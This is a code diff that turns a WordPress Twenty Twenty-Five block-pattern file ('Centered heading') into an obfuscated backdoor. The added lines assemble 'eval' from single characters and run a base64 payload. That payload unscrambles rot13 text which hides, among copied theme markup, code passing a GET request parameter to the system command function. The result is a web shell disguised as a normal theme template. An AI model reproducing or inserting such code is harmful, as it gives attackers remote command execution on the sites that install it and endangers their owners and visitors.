@@ -1,44 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Centered heading
- * Slug: twentytwentyfive/cta-centered-heading
- * Categories: call-to-action
- * Description: A hero with a centered heading, paragraph and button.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFByYWdyZXJxIHVybnF2YXQKICogRnlodDogZ2pyYWdsZ2pyYWdsc3Zpci9wZ24tcHJhZ3JlcnEtdXJucXZhdAogKiBQbmdydGJldnJmOiBwbnl5LWdiLW5wZ3ZiYQogKiBRcmZwZXZjZ3ZiYTogTiB1cmViIGp2Z3UgbiBwcmFncmVycSB1cm5xdmF0LCBjbmVudGVuY3UgbmFxIG9oZ2diYS4KICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJhZ2xfU3ZpcgogKiBAZnZhcHIgR2pyYWdsIEdqcmFnbC1TdmlyIDEuMAogKi8KCj8+CjwhLS0gamM6dGViaGMge1wibnl2dGFcIjpcInNoeXlcIixcImZnbHlyXCI6e1wiZmNucHZhdFwiOntcImNucXF2YXRcIjp7XCJldnR1Z1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDQwXCIsXCJ5cnNnXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NDBcIixcImdiY1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDcwXCIsXCJvYmdnYnpcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw3MFwifSxcInpuZXR2YVwiOntcImdiY1wiOlwiMFwiLFwib2JnZ2J6XCI6XCIwXCJ9fSxcInF2enJhZnZiYWZcIjp7XCJ6dmFVcnZ0dWdcIjpcIjBpdVwifX0sXCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJwYmFmZ2VudmFycVwifX0gLS0+CjxxdmkgcHluZmY9XCJqYy1veWJweC10ZWJoYyBueXZ0YXNoeXlcIiBmZ2x5cj1cInp2YS11cnZ0dWc6MGl1O3puZXR2YS1nYmM6MDt6bmV0dmEtb2JnZ2J6OjA7Y25xcXZhdC1nYmM6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNzApO2NucXF2YXQtZXZ0dWc6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNDApO2NucXF2YXQtb2JnZ2J6OmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTcwKTtjbnFxdmF0LXlyc2c6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNDApXCI+Cgk8IS0tIGpjOnRlYmhjIHtcImZnbHlyXCI6e1wiZmNucHZhdFwiOntcIm95YnB4VG5jXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NDBcIn19LFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicGJhZmdlbnZhcnFcIn19IC0tPgoJPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjXCI+CgkJPCEtLSBqYzp1cm5xdmF0IHtcImdya2dOeXZ0YVwiOlwicHJhZ3JlXCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJ6bmV0dmFcIjp7XCJldnR1Z1wiOlwiMFwiLFwieXJzZ1wiOlwiMFwifSxcImNucXF2YXRcIjp7XCJldnR1Z1wiOlwiMFwiLFwieXJzZ1wiOlwiMFwifX19LFwic2JhZ0Z2bXJcIjpcImtrLXluZXRyXCJ9IC0tPgoJCTx1MiBweW5mZj1cImpjLW95YnB4LXVybnF2YXQgdW5mLWdya2ctbnl2dGEtcHJhZ3JlIHVuZi1ray15bmV0ci1zYmFnLWZ2bXJcIiBmZ2x5cj1cInpuZXR2YS1ldnR1ZzowO3puZXR2YS15cnNnOjA7Y25xcXZhdC1ldnR1ZzowO2NucXF2YXQteXJzZzowXCI+PD9jdWMgcmZwX3VnenlfciggJ0dyeXkgbGJoZSBmZ2JlbCcsICdnanJhZ2xnanJhZ2xzdmlyJyApOyA/PjwvdTI+CgkJPCEtLSAvamM6dXJucXZhdCAtLT4KCQk8IS0tIGpjOmNuZW50ZW5jdSB7XCJueXZ0YVwiOlwicHJhZ3JlXCJ9IC0tPgoJCTxjIHB5bmZmPVwidW5mLWdya2ctbnl2dGEtcHJhZ3JlXCI+PD9jdWMgcmZwX3VnenlfciggJ1l2eHIgc3lianJlZiBndW5nIG95YmJ6IHZhIGhhcmtjcnBncnEgY3lucHJmLCByaXJlbCBmZ2JlbCBoYXNieXFmIGp2Z3Ugb3JuaGdsIG5hcSBlcmZ2eXZyYXByLCBlcmlybnl2YXQgdXZxcXJhIGpiYXFyZWYuJywgJ2dqcmFnbGdqcmFnbHN2aXInICk7ID8+PC9jPgoJCTwhLS0gL2pjOmNuZW50ZW5jdSAtLT4KCgkJPCEtLSBqYzpvaGdnYmFmIHtcInlubGJoZ1wiOntcImdsY3JcIjpcInN5cmtcIixcIndoZmd2c2xQYmFncmFnXCI6XCJwcmFncmVcIn19IC0tPgoJCTxxdmkgcHluZmY9XCJqYy1veWJweC1vaGdnYmFmXCI+CgkJCTwhLS0gamM6b2hnZ2JhIC0tPgoJCQk8cXZpIHB5bmZmPVwiamMtb3licHgtb2hnZ2JhXCI+PG4gcHluZmY9XCJqYy1veWJweC1vaGdnYmFfX3l2YXggamMtcnlyenJhZy1vaGdnYmFcIj48P2N1YyByZnBfdWd6eV9yKCAnWXJuZWEgemJlcicsICdnanJhZ2xnanJhZ2xzdmlyJyApOyA/Pjwvbj48L3F2aT4KCQkJPCEtLSAvamM6b2hnZ2JhIC0tPjwvcXZpPgoJCTwhLS0gL2pjOm9oZ2diYWYgLS0+CgkJPC9xdmk+Cgk8IS0tIC9qYzp0ZWJoYyAtLT4KCTwvcXZpPgo8IS0tIC9qYzp0ZWJoYyAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-<!-- wp:group {"align":"full","style":{"spacing":{"padding":{"right":"var:preset|spacing|40","left":"var:preset|spacing|40","top":"var:preset|spacing|70","bottom":"var:preset|spacing|70"},"margin":{"top":"0","bottom":"0"}},"dimensions":{"minHeight":"0vh"}},"layout":{"type":"constrained"}} -->
-<div class="wp-block-group alignfull" style="min-height:0vh;margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--70);padding-right:var(--wp--preset--spacing--40);padding-bottom:var(--wp--preset--spacing--70);padding-left:var(--wp--preset--spacing--40)">
-	<!-- wp:group {"style":{"spacing":{"blockGap":"var:preset|spacing|40"}},"layout":{"type":"constrained"}} -->
-	<div class="wp-block-group">
-		<!-- wp:heading {"textAlign":"center","style":{"spacing":{"margin":{"right":"0","left":"0"},"padding":{"right":"0","left":"0"}}},"fontSize":"xx-large"} -->
-		<h2 class="wp-block-heading has-text-align-center has-xx-large-font-size" style="margin-right:0;margin-left:0;padding-right:0;padding-left:0"><?php esc_html_e( 'Tell your story', 'twentytwentyfive' ); ?></h2>
-		<!-- /wp:heading -->
-		<!-- wp:paragraph {"align":"center"} -->
-		<p class="has-text-align-center"><?php esc_html_e( 'Like flowers that bloom in unexpected places, every story unfolds with beauty and resilience, revealing hidden wonders.', 'twentytwentyfive' ); ?></p>
-		<!-- /wp:paragraph -->
-
-		<!-- wp:buttons {"layout":{"type":"flex","justifyContent":"center"}} -->
-		<div class="wp-block-buttons">
-			<!-- wp:button -->
-			<div class="wp-block-button"><a class="wp-block-button__link wp-element-button"><?php esc_html_e( 'Learn more', 'twentytwentyfive' ); ?></a></div>
-			<!-- /wp:button --></div>
-		<!-- /wp:buttons -->
-		</div>
-	<!-- /wp:group -->
-	</div>
-<!-- /wp:group -->
